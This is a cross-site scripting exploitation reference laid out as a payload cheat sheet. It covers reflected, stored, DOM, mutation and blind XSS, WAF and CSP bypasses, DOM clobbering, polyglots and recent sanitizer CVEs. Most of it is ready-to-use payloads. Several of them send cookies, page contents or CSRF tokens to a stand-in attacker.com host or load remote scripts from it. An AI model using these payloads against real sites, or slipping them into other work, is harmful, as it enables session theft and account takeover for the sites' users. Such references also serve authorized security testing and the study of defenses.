# Cross-Site Scripting (XSS): Complete Exploitation Reference

## Taxonomy Deep Dive

### Reflected XSS
Payload is in the request and immediately reflected in the response.
```html
https://target.com/search?q=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```
**Key targets**: Search pages, error messages, redirect URLs, referrer headers reflected in response

### Stored XSS
Payload is stored on the server and served to all visitors.
```html
<!-- Profile display name stored in DB, rendered for all viewers -->
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
```
**Key targets**: Comments, profile fields, reviews, blog posts, forum signatures, support tickets

### DOM-Based XSS
Payload executed entirely in the browser via client-side JavaScript.
```javascript
// Vulnerable pattern: source -> sink
var name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = name;
```
**Sinks**: innerHTML, outerHTML, document.write(), eval(), setTimeout(), setInterval(), Function(), srcdoc, insertAdjacentHTML, createContextualFragment, location.href, window.name, postMessage
**Sources**: location.hash, location.search, location.pathname, document.referrer, document.cookie, postMessage, window.name, localStorage, sessionStorage, IndexedDB

### Mutation XSS (mXSS)
Exploits the gap between how a sanitizer parses HTML and how the browser re-parses it.
```html
<!-- Payload that looks safe to DOMPurify but mutates on re-parse -->
<svg><style><img/src=x onerror=alert(1)></style></svg>

<!-- DOMPurify CVE-2025-26791: CDATA closure mutation -->
<svg><![CDATA[>]]><img src=x onerror=alert(1)>
```

### Blind XSS
Fires in application contexts the attacker cannot directly see (admin panels, logs, email viewers).
```html
<img src=x onerror="document.location='https://attacker.com/blind?c='+btoa(document.body.innerHTML)">
```

### Universal XSS (UXSS)
XSS that bypasses the Same-Origin Policy, executing in arbitrary origin contexts.

## Context-Specific Payloads

### HTML Body Context
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
```

### HTML Attribute Context
```html
" onfocus=alert(1) autofocus="
" onmouseover=alert(1) "
" autofocus onfocus=alert(1) x="
' onfocus=alert(1) autofocus='
```

### JavaScript String Context
```javascript
'-alert(1)-'
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
```

### URL Context
```javascript
javascript:alert(1)
javascript:alert(document.cookie)
j a v a s c r i p t:alert(1)  (with encoded whitespace)
```

### JSON Context
```json
{"key": "value</script><script>alert(1)</script>"}
```

## WAF Bypass Techniques

### Case Variation
```html
<ScRiPt>alert(1)</sCrIpT>
<SVG/ONLOAD=alert(1)>
<img src=x onerror=alert(1)>
```

### Encoding
```html
%3Cscript%3Ealert(1)%3C/script%3E  (URL encoded)
&#60;script&#62;alert(1)&#60;/script&#62;  (HTML entities)
\x3Cscript\x3Ealert(1)\x3C/script\x3E  (Hex)
\u003Cscript\u003Ealert(1)\u003C/script\u003E  (Unicode)
```

### Tag Obfuscation
```html
<scr<script>ipt>alert(1)</scr</script>ipt>  (Nested tag bypass)
<<script>alert(1)//<</script>  (Double tag)
<SCRIPT>alert(1)</SCRIPT>  (UpperCase)
```

### Event Handler Variation
```html
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<body onpageshow=alert(1)>
<video onloadstart=alert(1) src=x>
<div style=width:1px;filter:onerror=alert(1)>
```

### Protocol Bypass
```html
javascript:alert(1)              (Standard)
JaVaScRiPt:alert(1)              (Case mix)
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74:alert(1)  (Hex encoding)
&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116:alert(1)  (Decimal entities)
```

## CSP Bypass Techniques

### JSONP Endpoints
```html
<!-- If target whitelists googleapis.com or similar -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.js">
</script><script>angular.module('').config(function($sceDelegateProvider){$sceDelegateProvider.resourceUrlWhitelist(['**'])});</script>
```

### Script Gadgets
```html
<!-- Angular JS sandbox escape -->
<div ng-app>{{$on.constructor('alert(1)')()}}</div>
```

### Base Tag Hijack
```html
<base href="https://attacker.com/">
<script src="/relative-path.js"></script>  <!-- Loads from attacker -->
```

### Nonce/Strict-Dynamic Bypass
```html
<!-- If one script on page has nonce, inject <script> before it -->
<script>alert(1)</script><script nonce="XYZ" src="legit.js"></script>
```

### Style/CSS Injection
```css
/* Exfiltrate CSRF token via CSS */
input[name=csrf_token][value^=a] { background: url(https://attacker.com/a) }
input[name=csrf_token][value^=b] { background: url(https://attacker.com/b) }
```

## DOM Clobbering

```html
<!-- Overwrite JavaScript variables with HTML elements -->
<a id=config><a id=config name=apiUrl href=https://attacker.com/evil.js>
<script>
  // If code checks if(config){ fetch(config.apiUrl).then(...) }
  // config now resolves to the anchor element
  var apiUrl = window.config.apiUrl || '/default/api';
  fetch(apiUrl);  // Fetches from attacker
</script>

<!-- Clobber form action -->
<form id=login><input type=submit></form>
<a id=login action=https://attacker.com/phish>

<!-- Overwrite document.currentScript -->
<img id=currentScript src=https://attacker.com/evil.js>
```

## Polyglot XSS

```javascript
/**/alert(1)//\'/*\`/*</script></style></textarea></title></pre>
<svg onload=alert(1)><script src=data:\x61\x6c\x65\x72\x74(1)>
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//-->
</script></title></style></textarea></pre>
```

## Blind XSS Delivery

```html
<!-- For admin panel / log viewer / email reader -->
<script>fetch('https://attacker.com/x?h='+btoa(document.documentElement.innerHTML))</script>
<link rel=stylesheet href=https://attacker.com/css?c=document.cookie>
<img src=x onerror="new Image().src='https://attacker.com/x?c='+document.cookie">
```

## XSS via Specific Sinks

| Sink | Payload |
|------|---------|
| innerHTML | <img src=x onerror=alert(1)> |
| outerHTML | <script>alert(1)</script> |
| eval | eval('alert(1)') |
| Function | Function('alert(1)')() |
| setTimeout | setTimeout('alert(1)') |
| setInterval | setInterval('alert(1)',100) |
| location= | javascript:alert(1) |
| script.src | //attacker.com/evil.js |
| iframe srcdoc | srcdoc=<script>alert(1)</script> |

## Recent CVEs (2024-2026)
| CVE | Product | Type | Details |
|-----|---------|------|---------|
| CVE-2025-26791 | DOMPurify < 3.2.4 | mXSS | CDATA closure mutation |
| CVE-2024-47875 | DOMPurify | mXSS | Nesting-based bypass |
| CVE-2025-1647 | Bootstrap 3 | DOM Clobbering | document.implementation clobbered |
| CVE-2024-6783 | Vue 2 | Template XSS | End-of-life, no patch |
| CVE-2026-0540 | DOMPurify 3.2.6 | mXSS | Foreign content namespace |

## Framework-Specific

### React (JSX with dangerouslySetInnerHTML)
```html
<div dangerouslySetInnerHTML={{__html: userInput}} />
```

### Vue.js (v-html)
```html
<div v-html="userInput"></div>
```

### Angular (bypass sanitization)
```javascript
this.sanitizer.bypassSecurityTrustHtml(userInput)
```

### jQuery
```javascript
$('#target').html(userInput)
$('<div>').append(userInput)
```